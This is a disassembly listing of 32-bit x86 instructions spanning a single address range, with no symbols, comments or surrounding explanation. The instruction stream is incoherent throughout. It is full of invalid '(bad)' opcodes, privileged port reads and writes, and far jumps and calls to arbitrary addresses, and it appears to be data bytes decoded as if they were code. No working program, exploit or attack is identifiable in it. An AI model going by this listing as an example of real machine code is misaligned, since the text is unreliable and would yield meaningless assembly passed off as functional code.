  691ed6:	sbb    al,BYTE PTR [edi+0x10]
  691ed9:	mov    gs,WORD PTR [edi]
  691edb:	mov    ds:0x66e3096c,eax
  691ee0:	out    0xf7,al
  691ee2:	mov    ds:0xec42e33,al
  691ee7:	push   ds
  691ee8:	lock or BYTE PTR [esp+esi*2+0x4335a19a],al
  691ef0:	or     ebx,edi
  691ef2:	xchg   ecx,eax
  691ef3:	xchg   ebx,eax
  691ef4:	jl     0x691f17
  691ef6:	shl    DWORD PTR [eax+0x309c0e82],cl
  691efc:	lock adc al,0x38
  691eff:	and    ebp,DWORD PTR [edi-0x2d8747e8]
  691f05:	push   edi
  691f06:	pop    DWORD PTR [esp+esi*1+0x40f985aa]
  691f0d:	fiadd  WORD PTR [ebx]
  691f0f:	adc    al,al
  691f11:	inc    ebp
  691f12:	dec    edx
  691f13:	mov    es,WORD PTR [ecx]
  691f15:	and    al,0xc0
  691f17:	scas   al,BYTE PTR es:[edi]
  691f18:	test   DWORD PTR [esi-0x6d7e5782],esi
  691f1e:	ficomp WORD PTR fs:[esi]
  691f21:	dec    ebx
  691f22:	cmp    al,0xd
  691f24:	jno    0x691f8b
  691f26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  691f27:	scas   eax,DWORD PTR es:[edi]
  691f28:	push   ds
  691f29:	out    0x80,eax
  691f2b:	add    ch,al
  691f2d:	pop    ss
  691f2e:	dec    edx
  691f2f:	lock xchg esp,eax
  691f31:	ret    
  691f32:	xor    bh,BYTE PTR [ecx+0x22]
  691f35:	dec    ecx
  691f36:	and    BYTE PTR [edi+esi*4],dl
  691f39:	jge    0x691ed7
  691f3b:	sbb    eax,0x47ec213e
  691f40:	test   eax,0x72b60548
  691f45:	cmp    DWORD PTR [ebx+0x6],ebx
  691f48:	rcl    BYTE PTR [eax+0x3b],cl
  691f4b:	pusha  
  691f4c:	push   es
  691f4d:	retf   
  691f4e:	lahf   
  691f4f:	fwait
  691f50:	scas   eax,DWORD PTR es:[edi]
  691f51:	cs jb  0x691f4e
  691f54:	xor    ebx,DWORD PTR [edx]
  691f56:	stc    
  691f57:	ins    BYTE PTR es:[edi],dx
  691f58:	int3   
  691f59:	push   esp
  691f5a:	sbb    al,0xc1
  691f5c:	xchg   DWORD PTR [esi],edi
  691f5e:	sbb    al,0xf6
  691f60:	jp     0x691fbc
  691f62:	mov    eax,0xb184048e
  691f67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  691f68:	shr    DWORD PTR [bx+di+0x7],0xcd
  691f6d:	dec    eax
  691f6e:	xchg   edx,eax
  691f6f:	inc    esi
  691f70:	push   cs
  691f71:	xchg   edx,eax
  691f72:	imul   DWORD PTR [ebx-0xc673a05]
  691f78:	cld    
  691f79:	mov    edx,0x61c1865e
  691f7e:	cwde   
  691f7f:	cld    
  691f80:	fsincos 
  691f82:	sti    
  691f83:	mov    DWORD PTR [esi-0x4d],esi
  691f86:	add    DWORD PTR [esi+0x2cb80a3c],ebx
  691f8c:	sbb    edi,DWORD PTR [ecx-0x473a47a]
  691f92:	out    0xdb,al
  691f94:	jle    0x691fb2
  691f96:	jne    0x691f6e
  691f98:	jno    0x691f43
  691f9a:	mov    al,0x86
  691f9c:	fcom   DWORD PTR [esi+0xd66dd3e]
  691fa2:	inc    edi
  691fa3:	std    
  691fa4:	ds cmp edx,ebp
  691fa7:	mov    bh,0xbd
  691fa9:	stc    
  691faa:	aas    
  691fab:	sar    BYTE PTR [eax+0x3],1
  691fae:	in     eax,0xb5
  691fb0:	push   0xa
  691fb2:	mov    edi,0x3d3fd389
  691fb7:	icebp  
  691fb8:	xlat   BYTE PTR ds:[ebx]
  691fb9:	cdq    
  691fba:	and    BYTE PTR [edx+0x5],0xaf
  691fbe:	push   cs
  691fbf:	sahf   
  691fc0:	push   edx
  691fc1:	cdq    
  691fc2:	jb     0x691f65
  691fc4:	jp     0x691f85
  691fc6:	sub    eax,0x20ee4ef8
  691fcb:	mov    esi,0x6683976f
  691fd0:	push   cs
  691fd1:	mov    al,0xb2
  691fd3:	and    esi,ecx
  691fd5:	jp     0x691f5b
  691fd7:	or     DWORD PTR [ecx+0x286acbdd],esp
  691fdd:	mov    esp,0x8422225e
  691fe2:	test   BYTE PTR [ebx-0x77],ch
  691fe5:	imul   esi
  691fe7:	inc    ebx
  691fe8:	push   0x3
  691fea:	repnz adc eax,0xc13501a1
  691ff0:	inc    edx
  691ff1:	or     ecx,DWORD PTR [ebp-0x3f1944f6]
  691ff7:	sub    eax,0xb699072f
  691ffc:	or     BYTE PTR ds:0xc3e9a3e,dl
  692002:	(bad)  
  692003:	mov    al,0xe3
  692005:	jg     0x69201b
  692007:	push   ds
  692008:	out    0xcf,al
  69200a:	dec    ecx
  69200b:	gs fs dec ebx
  69200e:	add    BYTE PTR [edx+edi*8+0x7f],dl
  692012:	jle    0x69202b
  692014:	jmp    0x9167:0x9e9c16f7
  69201b:	neg    BYTE PTR [ebp+0x195a19f1]
  692021:	loope  0x691fff
  692023:	dec    ecx
  692024:	or     eax,0xa3668488
  692029:	jge    0x691fb8
  69202b:	leave  
  69202c:	imul   edx,DWORD PTR [ebx+esi*4+0x4d],0xffffff98
  692031:	les    esp,FWORD PTR [esi+0x46]
  692034:	jg     0x691fbb
  692036:	dec    ecx
  692037:	out    dx,al
  692038:	aas    
  692039:	add    eax,DWORD PTR [ebx]
  69203b:	adc    eax,0x23c40d3
  692040:	es aaa 
  692042:	sbb    ah,BYTE PTR [edi]
  692044:	xor    DWORD PTR [esi],edx
  692046:	loope  0x6920a6
  692048:	ja     0x692056
  69204a:	repz pushf 
  69204c:	inc    esp
  69204d:	or     esp,ecx
  69204f:	sbb    DWORD PTR [eax],edi
  692051:	fmul   st(4),st
  692053:	add    bh,al
  692055:	shl    DWORD PTR [eax-0x3c339f0d],1
  69205b:	rcr    DWORD PTR [ebp-0x53101243],cl
  692061:	push   ebx
  692062:	xchg   ebp,eax
  692063:	loop   0x692090
  692065:	push   edx
  692066:	std    
  692067:	adc    ecx,ecx
  692069:	sub    al,0xd4
  69206b:	xor    edx,esp
  69206d:	call   0x2fa368e5
  692072:	mov    al,0x1e
  692074:	xchg   BYTE PTR [edx+edi*1],al
  692077:	mov    es,WORD PTR [ebx]
  692079:	pushf  
  69207a:	pusha  
  69207b:	loope  0x6920eb
  69207d:	or     ebp,DWORD PTR [ecx]
  69207f:	mov    WORD PTR ss:[ebp+0x13],0xb8ff
  692086:	ss adc eax,0x148808c9
  69208c:	rol    DWORD PTR [ecx],1
  69208e:	pop    eax
  69208f:	jae    0x6920b6
  692091:	pop    ebp
  692092:	mov    cl,0x4
  692094:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  692095:	add    ebx,DWORD PTR [esi]
  692097:	sub    DWORD PTR [eax-0x2ec9a2fd],edi
  69209d:	xchg   ebp,eax
  69209e:	mov    dh,0x5
  6920a0:	dec    ecx
  6920a1:	jg     0x69202f
  6920a3:	sbb    eax,0x363ba84
  6920a8:	outs   dx,DWORD PTR ds:[esi]
  6920a9:	pop    eax
  6920aa:	lea    esp,[ebp-0x58]
  6920ad:	mov    ebx,0x7e568d6d
  6920b2:	sub    BYTE PTR [eax+0x7],bl
  6920b5:	xchg   esp,eax
  6920b6:	xchg   esi,edi
  6920b8:	adc    eax,0xbef04efe
  6920bd:	mov    esi,DWORD PTR ds:0xb2b35a4e
  6920c3:	or     al,0x3c
  6920c5:	pop    ebx
  6920c6:	ds xchg ebx,eax
  6920c8:	aam    0x5b
  6920ca:	sbb    DWORD PTR [ebp+0x4b],eax
  6920cd:	lock into 
  6920cf:	xor    bh,ch
  6920d1:	cmp    dh,cl
  6920d3:	lods   eax,DWORD PTR ds:[esi]
  6920d4:	out    0xa3,eax
  6920d6:	es cmc 
  6920d8:	inc    edx
  6920d9:	fldcw  WORD PTR [ecx+eiz*4+0x48]
  6920dd:	je     0x6920cf
  6920df:	das    
  6920e0:	jg     0x692094
  6920e2:	js     0x6920d6
  6920e4:	fisubr DWORD PTR [esi+0x12c624de]
  6920ea:	xor    ecx,DWORD PTR [edi+ecx*1+0x346312df]
  6920f1:	mov    esi,0x443f946
  6920f6:	stos   DWORD PTR es:[edi],eax
  6920f7:	mov    ah,0x17
  6920f9:	out    dx,eax
  6920fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6920fb:	rcr    BYTE PTR [esi+0x73],cl
  6920fe:	bnd jl 0x69217c
  692101:	cld    
  692102:	sub    eax,DWORD PTR [edx-0x774041c5]
  692108:	push   0xe49c2096
  69210d:	shl    BYTE PTR ds:0x154ae2e7,1
  692113:	push   ebp
  692114:	xchg   ebx,eax
  692115:	lods   eax,DWORD PTR ds:[esi]
  692116:	(bad)  
  692117:	(bad)  
  692119:	pop    esp
  69211a:	and    BYTE PTR [ebx-0x796e4c8f],al
  692120:	not    DWORD PTR [edx+0x4abeed26]
  692126:	inc    ecx
  692127:	ret    
  692128:	nop
  692129:	push   ebp
  69212a:	or     dh,BYTE PTR [esi+0x311ec2d5]
  692130:	push   ss
  692131:	gs dec ecx
  692133:	or     ah,BYTE PTR [esi-0x26]
  692136:	js     0x69213e
  692138:	add    al,0x46
  69213a:	test   DWORD PTR [ecx+0x3ccb0fb9],0x6140cb6a
  692144:	cwde   
  692145:	push   eax
  692146:	xchg   ebx,eax
  692147:	sub    eax,0x89689f10
  69214c:	sub    BYTE PTR [edi+eiz*8],dh
  69214f:	in     al,dx
  692150:	call   0x261e:0x15bbb115
  692157:	shr    BYTE PTR [esi+0x51],1
  69215a:	sbb    DWORD PTR [edi+0x398967a8],ebp
  692160:	icebp  
  692161:	or     ebp,eax
  692163:	add    BYTE PTR [edi-0x9],ah
  692166:	divps  xmm2,XMMWORD PTR [ecx+ecx*2-0x66]
  69216b:	mov    esi,0x1dae9602
  692170:	fs xchg ecx,eax
  692172:	(bad)  
  692174:	iret   
  692175:	fnstsw WORD PTR [ebp-0x5f]
  692178:	add    al,BYTE PTR [esi+0x6c29e2c1]
  69217e:	cwde   
  69217f:	dec    eax
  692180:	inc    edx
  692181:	mov    WORD PTR [ebx],fs
  692183:	push   ds
  692184:	mov    BYTE PTR [esi],bh
  692186:	dec    eax
  692187:	xlat   BYTE PTR ds:[ebx]
  692188:	add    al,0x62
  69218a:	sbb    ecx,0xb206e2c3
  692190:	mov    ds:0xb3bd84a9,al
  692195:	xor    eax,0x28bbc0e8
  69219a:	loop   0x6921e8
  69219c:	pop    edx
  69219d:	jne    0x692166
  69219f:	jae    0x6921ac
  6921a1:	lahf   
  6921a2:	(bad)  
  6921a3:	jne    0x692189
  6921a5:	mov    cl,0x54
  6921a7:	mov    cl,BYTE PTR [ebx]
  6921a9:	xchg   BYTE PTR [eax-0x45],dh
  6921ac:	leave  
  6921ad:	iret   
  6921ae:	jnp    0x692145
  6921b0:	pop    ebp
  6921b1:	jge    0x6921d2
  6921b3:	jo     0x692152
  6921b5:	icebp  
  6921b6:	xor    BYTE PTR [edi+0x75f6b178],0x8
  6921bd:	inc    esi
  6921be:	adc    DWORD PTR [edi-0x49c4d488],0x5f6eb16f
  6921c8:	mov    eax,0x790fdbf1
  6921cd:	inc    esp
  6921ce:	inc    edx
  6921cf:	sbb    eax,0xc07020f8
  6921d4:	pushf  
  6921d5:	leave  
  6921d6:	and    esp,DWORD PTR [ebx-0x6d]
  6921d9:	mov    ds:0x222b92f3,eax
  6921de:	mov    ebx,DWORD PTR [edi]
  6921e0:	scas   al,BYTE PTR es:[edi]
  6921e1:	(bad)  
  6921e2:	es retf 0xa8c8
  6921e6:	ins    BYTE PTR es:[edi],dx
  6921e7:	xchg   esi,eax
  6921e8:	sub    esp,eax
  6921ea:	cld    
  6921eb:	cmp    al,0x76
  6921ed:	shl    BYTE PTR [esi-0x3511883],0x1e
  6921f4:	sub    DWORD PTR [eax],esp
  6921f6:	jmp    0xfe69:0x49e8325c
  6921fd:	test   BYTE PTR [ebp-0x6ac03481],bl
  692203:	pop    ebx
  692204:	icebp  
  692205:	shl    dl,cl
  692207:	or     eax,0x4961f7a8
  69220c:	pop    ebx
  69220d:	dec    edx
  69220e:	push   0x4239a8ae
  692213:	cli    
  692214:	stos   DWORD PTR es:[edi],eax
  692215:	aad    0x66
  692217:	xor    dh,BYTE PTR [edx-0x7c]
  69221a:	test   ch,0xec
  69221d:	repnz daa 
  69221f:	mov    ds:0x7d7b4efb,al
  692224:	inc    eax
  692225:	mov    ebx,0x157d17c
  69222a:	addr16 int 0xc6
  69222d:	xchg   BYTE PTR [edi+0x78],bl
  692230:	rcr    dh,cl
  692232:	out    0x9a,al
  692234:	loop   0x692287
  692236:	sbb    dh,ch
  692238:	sub    al,0xb8
  69223a:	adc    eax,0xf8b8fa56
  69223f:	jnp    0x692221
  692241:	push   ecx
  692242:	lds    esp,FWORD PTR [ebx]
  692244:	dec    eax
  692245:	in     al,dx
  692246:	in     al,dx
  692247:	dec    esp
  692248:	lods   al,BYTE PTR ds:[esi]
  692249:	sub    BYTE PTR [ebx+0x1828daef],0x81
  692250:	jo     0x69220a
  692252:	cmp    al,0x54
  692254:	in     eax,dx
  692255:	mov    eax,0x5520190a
  69225a:	mov    edx,0x2587560b
  69225f:	mov    BYTE PTR [ebp+0x3f],ah
  692262:	pop    esi
  692263:	inc    ebx
  692264:	dec    esi
  692265:	call   0xf9ba:0xb478a5c2
  69226c:	outs   dx,DWORD PTR ds:[esi]
  69226d:	(bad)  
  69226e:	clc    
  69226f:	ins    DWORD PTR es:[edi],dx
  692270:	pop    edi
  692271:	cs jle 0x6922f0
  692274:	mov    ah,0xcf
  692276:	je     0x692212
  692278:	repnz (bad) 
  69227a:	into   
  69227b:	mov    al,0x82
  69227d:	xchg   ebx,eax
  69227e:	lea    eax,[ebx-0x1596ca55]
  692284:	call   0x68d32084
  692289:	hlt    
  69228a:	out    0x90,al
  69228c:	pop    edi
  69228d:	push   ds
  69228e:	ds xchg ch,dl
  692291:	shl    BYTE PTR [ecx-0x30],0x65
  692295:	inc    esi
  692296:	add    edi,DWORD PTR [edx+ebp*1+0x49dadea9]
  69229d:	push   edi
  69229e:	xor    edx,DWORD PTR [edi-0x4e]
  6922a1:	and    al,0x3f
  6922a3:	dec    edi
  6922a4:	adc    BYTE PTR [eax-0x50],0xa2
  6922a8:	pusha  
  6922a9:	out    0xe0,eax
  6922ab:	inc    esp
  6922ac:	inc    edi
  6922ad:	mov    DWORD PTR ds:0x3c2ea09e,ebp
  6922b3:	rcl    BYTE PTR [edi],1
  6922b5:	ins    BYTE PTR es:[edi],dx
  6922b6:	enter  0x8e86,0x83
  6922ba:	addr16 push ss
  6922bc:	mov    ebp,0x7bd052cc
  6922c1:	scas   al,BYTE PTR es:[edi]
  6922c2:	clc    
  6922c3:	dec    eax
  6922c4:	mov    ebp,0x68ed18ea
  6922c9:	inc    edi
  6922ca:	dec    edx
  6922cb:	xchg   esi,eax
  6922cc:	mov    gs,WORD PTR [edx+0x20]
  6922cf:	xchg   ecx,eax
  6922d0:	inc    ebp
  6922d1:	ret    0x9547
  6922d4:	aam    0x4b
  6922d6:	dec    eax
  6922d7:	popa   
  6922d8:	mov    ah,al
  6922da:	pop    ebp
  6922db:	mov    ch,0xb6
  6922dd:	(bad)  
  6922de:	ficomp WORD PTR [ecx-0x3e7074bf]
  6922e4:	imul   ebp,DWORD PTR [ebx+edx*2],0xffffff87
  6922e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6922e9:	jg     0x69234e
  6922eb:	or     DWORD PTR [esi-0x1c29291f],edi
  6922f1:	in     eax,0xd
  6922f3:	or     ebx,DWORD PTR [ecx-0x36]
  6922f6:	mov    al,ds:0x23f65800
  6922fb:	inc    edx
  6922fc:	push   ebp
  6922fd:	adc    DWORD PTR [esi-0x65],edx
  692300:	push   ecx
  692301:	inc    esp
  692302:	add    al,0xc9
  692304:	jg     0x692351
  692306:	xchg   ebx,eax
  692307:	mov    ecx,0x43490811
  69230c:	data16 mov dh,0x5c
  69230f:	ins    BYTE PTR es:[edi],dx
  692310:	jmp    0xec85:0x1b77168d
  692317:	(bad)  
  692318:	jo     0x692324
  69231a:	in     eax,0xe8
  69231c:	xchg   edi,eax
  69231d:	ja     0x69237c
  69231f:	jl     0x69231f
  692321:	sub    DWORD PTR [edx],edx
  692323:	pop    ds
  692324:	loope  0x6922dc
  692326:	fwait
  692327:	rcl    BYTE PTR [ebx+eax*4+0x6860b3cc],cl
  69232e:	aam    0x56
  692330:	jno    0x69234d
  692332:	in     eax,0x46
  692334:	push   eax
  692335:	scas   eax,DWORD PTR es:[edi]
  692336:	out    0xb4,eax
  692338:	xchg   al,dh
  69233a:	ficom  DWORD PTR [eax-0x3b]
  69233d:	or     al,0x81
  69233f:	jmp    0x2d54b5af
  692344:	les    ecx,FWORD PTR [eax-0x72]
  692347:	retf   0x9997
  69234a:	mov    edi,0xd6227e8b
  69234f:	or     eax,0x2b7cade6
  692354:	fisub  WORD PTR [ecx-0x3ff811a7]
  69235a:	call   0x929e0db9
  69235f:	lea    edi,[ecx]
  692361:	mov    bh,BYTE PTR [ebp+0x45]
  692364:	push   ss
  692365:	and    esp,edx
  692367:	cwde   
  692368:	xor    esp,DWORD PTR [ecx]
  69236a:	je     0x6923bb
  69236c:	outs   dx,DWORD PTR ds:[esi]
  69236d:	push   edi
  69236e:	shl    DWORD PTR [edi+0x81dd373],1
  692374:	mov    BYTE PTR [edx],dh
  692376:	and    dl,al
  692378:	not    al
  69237a:	leave  
  69237b:	lods   eax,DWORD PTR ds:[esi]
  69237c:	pop    edi
  69237d:	xchg   ecx,eax
  69237e:	mov    edx,0xd4caede4
  692383:	jmp    0x692386
  692385:	les    edx,FWORD PTR [ecx]
  692387:	lds    ebp,FWORD PTR [esi+0x43]
  69238a:	add    al,0x6e
  69238c:	sub    al,0x42
  69238e:	(bad)  
  69238f:	cmc    
  692390:	xchg   esi,eax
  692391:	clc    
  692392:	retf   0x4e8c
  692395:	xor    dh,dh
  692397:	mov    esp,0xbf25ad6c
  69239c:	stos   DWORD PTR es:[edi],eax
  69239d:	pusha  
  69239e:	jnp    0x69236f
  6923a0:	mov    eax,ds:0x3fab96d0
  6923a5:	std    
  6923a6:	adc    al,BYTE PTR [esi]
  6923a8:	xor    eax,0x2459c9c8
  6923ad:	mov    ds:0xa0c914a,al
  6923b2:	push   ss
  6923b3:	xchg   ebp,eax
  6923b4:	mov    ebp,0x55658dde
  6923b9:	mov    BYTE PTR [eax+0x708a1d46],ch
  6923bf:	int    0x65
  6923c1:	or     al,0xa9
  6923c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6923c4:	dec    ebx
  6923c5:	push   cs
  6923c6:	jecxz  0x69243b
  6923c8:	pop    esp
  6923c9:	push   edi
  6923ca:	mov    DWORD PTR [edi],edx
  6923cc:	jns    0x6923c8
  6923ce:	hlt    
  6923cf:	stc    
  6923d0:	jno    0x692359
  6923d2:	out    dx,eax
  6923d3:	lds    edi,FWORD PTR [eax-0x5a]
  6923d6:	in     al,dx
  6923d7:	xor    al,0x22
  6923d9:	lock jl 0x69240e
  6923dc:	dec    edx
  6923dd:	mov    ch,ah
  6923df:	leave  
  6923e0:	cmp    eax,0xfced5bcc
  6923e5:	nop
  6923e6:	inc    ecx
  6923e7:	pop    es
  6923e8:	fs push ebp
  6923ea:	int    0x4
  6923ec:	(bad)  
  6923ee:	xchg   esi,eax
  6923ef:	cs cli 
  6923f1:	dec    ecx
  6923f2:	sahf   
  6923f3:	int    0xf2
  6923f5:	mov    eax,0xc1f317da
  6923fa:	push   cs
  6923fb:	mov    ecx,0xabc6e24b
  692400:	ds jae 0x6923e3
  692403:	hlt    
  692404:	jmp    FWORD PTR [edx+0x6b]
  692407:	(bad)  
  692408:	or     al,0x63
  69240a:	ret    0xfd9
  69240d:	adc    BYTE PTR [ebx-0xdd7c435],ch
  692413:	inc    ebp
  692414:	or     edx,ebp
  692416:	or     eax,0x7babca00
  69241b:	retf   
  69241c:	and    eax,DWORD PTR [ecx-0x33b09792]
  692422:	or     ebp,DWORD PTR [di]
  692425:	retf   0xaca8
  692428:	out    0x40,al
  69242a:	(bad)  
  69242b:	and    eax,0x2955c700
  692430:	adc    BYTE PTR [esi],0x74
  692433:	xor    BYTE PTR [edi+0x5a7372b1],ah
  692439:	or     edx,DWORD PTR [ebx-0x17f9e02e]
  69243f:	stos   DWORD PTR es:[edi],eax
  692440:	mov    bh,0x8b
  692442:	neg    BYTE PTR [ebx-0x34]
  692445:	fwait
  692446:	leave  
  692447:	aad    0x9b
  692449:	(bad)  
  69244a:	icebp  
  69244b:	lods   eax,DWORD PTR ds:[esi]
  69244c:	nop
  69244d:	mov    DWORD PTR [esi],edx
  69244f:	lahf   
  692450:	inc    eax
  692451:	imul   DWORD PTR [ebp+0x52d03d]
  692457:	mov    bh,0x69
  692459:	cwde   
  69245a:	(bad)  
  69245b:	shr    BYTE PTR [ebp+0x50036d17],1
  692461:	mov    edi,0xa4529030
  692466:	jae    0x692455
  692468:	das    
  692469:	out    0xb3,eax
  69246b:	jp     0x692442
  69246d:	sbb    ebp,DWORD PTR ds:0xe00e8972
  692473:	mov    ebx,es
  692475:	push   edi
  692476:	push   ebp
  692477:	push   0xffffffab
  692479:	jl     0x692434
  69247b:	ds push ds
  69247d:	in     al,dx
  69247e:	jl     0x6924bd
  692480:	inc    bl
  692482:	xchg   esp,eax
  692483:	lods   al,BYTE PTR ds:[esi]
  692484:	fnstenv [ebp-0x5f]
  692487:	imul   esp,DWORD PTR [edi-0x52],0x8
  69248b:	into   
  69248c:	imul   eax,ebx,0xffffffdd
  69248f:	out    dx,al
  692490:	outs   dx,BYTE PTR ds:[esi]
  692491:	adc    eax,0xfa6d329d
  692496:	stos   DWORD PTR es:[edi],eax
  692497:	aam    0x51
  692499:	mov    cx,0x9c2a
  69249d:	scas   al,BYTE PTR es:[edi]
  69249e:	std    
  69249f:	adc    esi,esp
  6924a1:	adc    eax,0x2bc45b44
  6924a6:	jns    0x692472
  6924a8:	xchg   ebx,eax
  6924a9:	xchg   edi,eax
  6924aa:	enter  0xbf52,0x6e
  6924ae:	int3   
  6924af:	add    ebx,ecx
  6924b1:	fbld   TBYTE PTR [ecx-0x75]
  6924b4:	jb     0x692469
  6924b6:	cmp    eax,0x5f129d35
  6924bb:	mov    bh,0xbc
  6924bd:	scas   al,BYTE PTR es:[edi]
  6924be:	mov    ch,0xb2
  6924c0:	and    al,0x1f
  6924c2:	add    cl,al
  6924c4:	pusha  
  6924c5:	cs stos DWORD PTR es:[edi],eax
  6924c7:	lock outs dx,DWORD PTR ds:[esi]
  6924c9:	repnz in al,0xd0
  6924cc:	and    al,BYTE PTR [edx+0x66]
  6924cf:	add    eax,0x59619570
  6924d4:	stc    
  6924d5:	mov    al,0xbe
  6924d7:	pop    ecx
  6924d8:	imul   ebp,edi,0x5fa18a08
  6924de:	cmp    eax,0xc4318572
  6924e3:	inc    edx
  6924e4:	xor    al,BYTE PTR [eax+0x4d9cac54]
  6924ea:	pop    eax
  6924eb:	dec    ebx
  6924ec:	retf   
  6924ed:	jmp    0x69249b
  6924ef:	jne    0x69248f
  6924f1:	mov    al,al
  6924f3:	sub    eax,0x41ed127f
  6924f8:	dec    eax
  6924f9:	ds test esp,ecx
  6924fc:	xlat   BYTE PTR ds:[ebx]
  6924fd:	jb     0x692547
  6924ff:	sbb    eax,0xdaff9626
  692504:	(bad)  
  692505:	nop
  692506:	mov    ebp,0xcd593a3c
  69250b:	(bad)  
  69250c:	cmc    
  69250d:	mov    dh,0xce
  69250f:	adc    DWORD PTR [eax+ebp*1-0x2b5de1c7],edx
  692516:	aam    0x81
  692518:	scas   al,BYTE PTR es:[edi]
  692519:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69251a:	pusha  
  69251b:	fnsave [ebx+0x64]
  69251e:	dec    ecx
  69251f:	sub    al,0x90
  692521:	mov    ds:0xbcba79e3,al
  692526:	mov    edx,DWORD PTR [ebp-0x5253e210]
  69252c:	push   ss
  69252d:	(bad)  
  69252e:	int    0x29
  692530:	psrld  mm1,QWORD PTR [eax+0x329e4186]
  692537:	scas   eax,DWORD PTR es:[edi]
  692538:	jae    0x6925b8
  69253a:	sbb    al,0xca
  69253c:	xor    eax,0xff64be2c
  692541:	adc    ah,BYTE PTR [ecx+0x31]
  692544:	sub    BYTE PTR [eax],bl
  692546:	push   ss
  692547:	inc    esi
  692548:	adc    cl,BYTE PTR ds:0x6f6ddef8
  69254e:	inc    edi
  69254f:	push   ecx
  692550:	les    ecx,FWORD PTR [ecx]
  692552:	popa   
  692553:	dec    esp
  692554:	push   edi
  692555:	jbe    0x6924dc
  692557:	cmc    
  692558:	ror    DWORD PTR [edi+0x35],1
  69255b:	and    eax,0x97616534
  692560:	pop    esi
  692561:	mov    eax,ds:0x38b6d5d1
  692566:	div    DWORD PTR [edx-0x4ce5c25d]
  69256c:	push   edx
  69256d:	fidiv  WORD PTR [edi]
  69256f:	xor    eax,0xecd0c38
  692574:	lods   eax,DWORD PTR ds:[esi]
  692575:	xchg   ebp,eax
  692576:	ror    DWORD PTR [eax+0x13],cl
  692579:	or     DWORD PTR [ebx],edx
  69257b:	rol    DWORD PTR [edi-0x7f],0x8c
  69257f:	xor    DWORD PTR [edx],edi
  692581:	cmp    bl,ch
  692583:	daa    
  692584:	mov    al,ds:0x53476d65
  692589:	cmc    
  69258a:	cmp    eax,0xe4e62987
  69258f:	dec    esp
  692590:	dec    ebx
  692591:	icebp  
  692592:	xor    BYTE PTR [ebx],bl
  692594:	popf   
  692595:	in     eax,dx
  692596:	mov    ch,0x72
  692598:	pop    DWORD PTR [edi-0x23]
  69259b:	mov    ecx,0x6d8fc559
  6925a0:	out    0x26,eax
  6925a2:	push   edi
  6925a3:	nop
  6925a4:	mov    ebx,0x46e7c79b
  6925a9:	inc    edi
  6925aa:	(bad)  
  6925ab:	or     ebp,DWORD PTR [esi-0x18]
  6925ae:	xcrypt-ecb (bad)
  6925af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6925b0:	retf   0x622e
  6925b3:	sub    ebx,DWORD PTR [ecx]
  6925b5:	dec    edi
  6925b6:	daa    
  6925b7:	jp     0x6925ad
  6925b9:	mov    ah,0x29
  6925bb:	rol    BYTE PTR [esi-0x59d0b993],cl
  6925c1:	aad    0xb
  6925c3:	test   eax,eax
  6925c5:	cld    
  6925c6:	cmc    
  6925c7:	cdq    
  6925c8:	or     bh,BYTE PTR [eax-0x13cb4353]
  6925ce:	mov    ch,0x16
  6925d0:	add    eax,esi
  6925d2:	repz push ecx
  6925d4:	repz aas 
  6925d6:	lds    esp,FWORD PTR [ebx+0x2a]
  6925d9:	add    BYTE PTR [edi+edx*1+0x51],ch
  6925dd:	ins    BYTE PTR es:[edi],dx
  6925de:	cmp    eax,0x85110238
  6925e3:	jge    0x6925a6
  6925e5:	ja     0x692638
  6925e7:	jb     0x6925aa
  6925e9:	enter  0x4a09,0x9b
  6925ed:	cld    
  6925ee:	adc    DWORD PTR [edx-0x74031556],ebp
  6925f4:	dec    edx
  6925f5:	jns    0x692671
  6925f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6925f8:	jp     0x692598
  6925fa:	xchg   DWORD PTR [edi+edx*4-0x6],ecx
  6925fe:	call   0xec1c:0xba3534cd
  692605:	mov    WORD PTR [edx-0x26678815],ds
  69260b:	mov    ecx,0x40e9a7c5
  692610:	cmp    eax,0x5625adbe
  692615:	lea    ecx,[esi]
  692617:	jnp    0x6925d1
  692619:	push   ebp
  69261a:	push   ebp
  69261b:	and    dl,BYTE PTR [edx-0x28]
  69261e:	inc    edx
  69261f:	sar    esp,1
  692621:	sbb    eax,0x1356e667
  692626:	or     BYTE PTR [ebp+0x78],cl
  692629:	xlat   BYTE PTR ds:[ebx]
  69262a:	scas   al,BYTE PTR es:[edi]
  69262b:	push   esp
  69262c:	leave  
  69262d:	aas    
  69262e:	xor    DWORD PTR ds:0xf2b16cfd,eax
  692634:	add    dh,bl
  692636:	push   es
  692637:	lahf   
  692638:	push   ss
  692639:	push   ebx
  69263a:	push   esp
  69263b:	icebp  
  69263c:	sti    
  69263d:	fst    QWORD PTR [esi+0x67]
  692640:	pop    DWORD PTR [edx+0x11]
  692643:	in     eax,0xb9
  692645:	in     eax,dx
  692646:	adc    al,0x1f
  692648:	fcomip st,st(5)
  69264a:	mov    ebp,0xfae8b56d
  69264f:	and    ah,BYTE PTR [edi-0x50]
  692652:	bound  ebp,QWORD PTR es:[esi+0x7e]
  692656:	xchg   esi,eax
  692657:	stc    
  692658:	jnp    0x6926bc
  69265a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69265b:	aam    0xeb
  69265d:	addr16 jmp 0x69261b
  692660:	pop    esi
  692661:	ret    0x5dc1
  692664:	les    esp,FWORD PTR [ebx]
  692666:	rcl    BYTE PTR [ecx+0x1e31c97b],cl
  69266c:	ret    
  69266d:	push   eax
  69266e:	fs add bl,dh
  692671:	mov    ecx,0x7a870aae
  692676:	jmp    0x6926f2
  692678:	stc    
  692679:	and    al,0xe3
  69267b:	jae    0x6926fa
  69267d:	or     ch,BYTE PTR [edi+0x68924471]
  692683:	jecxz  0x6926db
  692685:	fs scas eax,DWORD PTR es:[edi]
  692687:	inc    ebp
  692688:	sub    al,0x88
  69268a:	pop    ebp
  69268b:	repz rol DWORD PTR [ebx+eiz*8-0x24],0x81
  692691:	(bad)  
  692692:	fistp  WORD PTR [ebx+0x2c]
  692695:	cs sahf 
  692697:	sub    DWORD PTR [ebx],esi
  692699:	je     0x692715
  69269b:	call   0xeb5dfac3
  6926a0:	out    dx,al
